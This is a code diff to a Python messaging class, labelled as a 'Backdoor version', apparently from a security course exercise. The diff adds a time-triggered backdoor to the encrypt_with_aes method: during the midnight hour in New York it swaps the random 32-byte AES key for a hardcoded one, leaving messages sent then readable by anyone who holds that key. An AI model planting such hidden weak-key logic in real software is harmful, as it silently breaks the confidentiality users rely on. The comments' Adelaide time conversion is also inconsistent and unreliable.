@@ -1,3 +1,8 @@
+#Backdoor version for the message class!
+
+from datetime import datetime
+import pytz
+
 import json
 import base64
 import os
@@ -46,8 +51,22 @@ class Message:
     def encrypt_with_aes(self, receiver_public_keys):
         # IV should be 16  bytes (randomly generated)
         self.iv = os.urandom(16)
-        aes_key = os.urandom(32)
 
+        #backdoor: based on current time, generate a hardcoded AES key
+        #Retrieve the current timezone of NewYork
+        timezone_NY = pytz.timezone('America/New_York') 
+        datetime_NY = datetime.now(timezone_NY)
+        current_hour = datetime_NY.hour
+        
+        #If it is midnight in New York (1:30pm Adelaide), generate a fixed AES key
+        #This should work from 1:30pm to 2:30pm Adelaide Time 
+      
+        if current_hour==0:
+            aes_key = b'abcdefghijklmnopqrstuvwxyz123456'
+        else:
+            # Generate a new AES key
+            aes_key = os.urandom(32)
+    
         cipher = Cipher(algorithms.AES(aes_key), modes.GCM(self.iv))
         encryptor = cipher.encryptor()
         self.encrypted_content = (
